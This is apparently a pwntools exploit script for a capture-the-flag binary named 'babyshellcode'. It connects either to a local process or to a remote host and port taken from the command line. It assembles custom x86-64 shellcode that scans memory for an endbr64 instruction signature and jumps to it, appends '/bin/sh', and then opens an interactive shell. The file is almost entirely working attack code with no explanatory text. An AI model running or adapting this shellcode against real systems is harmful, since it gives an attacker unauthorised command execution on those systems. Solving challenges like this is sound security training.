from pwn import *
import sys
from time import sleep
from LibcSearcher import *

proc = './babyshellcode'
if len(sys.argv) == 1:
    c = process(proc)
elif len(sys.argv) == 2:
    serverport = sys.argv[1].split(':')
    c = remote(serverport[0], int(serverport[1]))
else:
    c = remote(sys.argv[1], int(sys.argv[2]))
context.binary = proc
elf = ELF(proc)
rop = ROP(proc)

a = '''
lea rsp, [rip + 4000]
lea rdi, [rip + 49]
lea rcx, [rip - 20]
lea rdx, [rip + 6]
lea rax, [rdx + 25]
push rax
push rdx
lea rcx, [rcx - 1]
cmp dword ptr [rcx], 0xfa1e0ff3
pushf
pop rbx
and rbx, 64
shr rbx, 3
add rbx, rsp
jmp qword ptr [rbx]
call rcx
jmp rdx
'''

raw_input()
c.sendline(asm(a) + '/bin/sh\x00')

c.interactive()
